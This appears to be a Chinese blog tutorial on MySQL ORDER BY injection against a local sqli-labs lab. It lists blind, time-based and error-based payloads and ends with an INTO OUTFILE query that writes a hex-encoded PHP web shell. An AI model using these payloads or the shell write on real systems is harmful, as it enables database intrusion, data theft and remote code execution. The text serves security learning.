---
title: MySQL注入系列之order by 注入(二)
date: 2017-03-22 14:21:44
categories: Web安全
tags:
    - MySQL注入
    - order by
---

## order by 基础知识

`ORDER BY {col_name | expr | position}`, order by 后面可以跟字段名，表达式和字段的位置，字段的位置需要是整数型。

<!-- more -->

## 实验环境

本地搭建 [sqli-lab](https://github.com/Audi-1/sqli-labs) 环境，选取lesson-52作为盲注测试目标

* lesson-52 核心代码

    ```php
    $id=$_GET['sort'];    
    if(isset($id))
    {
        ...
        $sql="SELECT * FROM users ORDER BY $id";
    ```

使用`asc`和`desc`关键词测试是否为order by 注入，根据下面结果可以得知注入点为order by注入

{% asset_img asc.png %}
{% asset_img desc.png %}

## order by 注入

基于 order by 的注入有盲注和报错注入

## order by 盲注

### 需要知道`字段名`

需要`字段名`的情况通常是，执行了查询语句，然后根据查询结果排序的差别进行盲注

* 使用 if(1<2, id, username)或者类似的表达式来布尔盲注或者时间盲注

条件判断之后需要选择字段名，如: id，username，而不能是1，2等表示字段的位置的数字，因为1，2会被判断为字符返回，而不是整数类型，所以必须知道字段名。

```
case when (true) then id else username end

if((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)<=128,id,username)
```

### 不需要知道`字段名`

* 引起mysql错误进行盲注

```
if(1=0,1,(select 1 from information_schema.tables))
case when(2<1) then 1 else 1*(select 1 from information_schema.tables)end)=1
```

条件为false是，值为`select 1 from information_schema.tables`，mysql会报错: `Subquery returns more than 1 row`, 导致查询结果为空.

这样就可以根据查询结果是否为空，判断条件的真假


* 基于时间的盲注

```
if(1,sleep(3),1)
```

* 基于rand()的盲注

`order by rand(true);` `order by rand(false);` 返回不同进行盲注。原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数排序，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。

```
rand(ascii(mid(database(),1,1))=109)
```

## order by 报错注入


### procedure 存储过程

* 支持报错

本地测试没成功，可能和mysql版本有关

```
mysql> SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.1.73-log'
```

* 不支持报错，用time-based

```
mysql> SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);
ERROR 1105 (HY000): XPATH syntax error: ':0'
```

* GETSHELL：

```
mysql> SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/2.php' LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E;
Query OK, 1 row affected (0.00 sec)
```
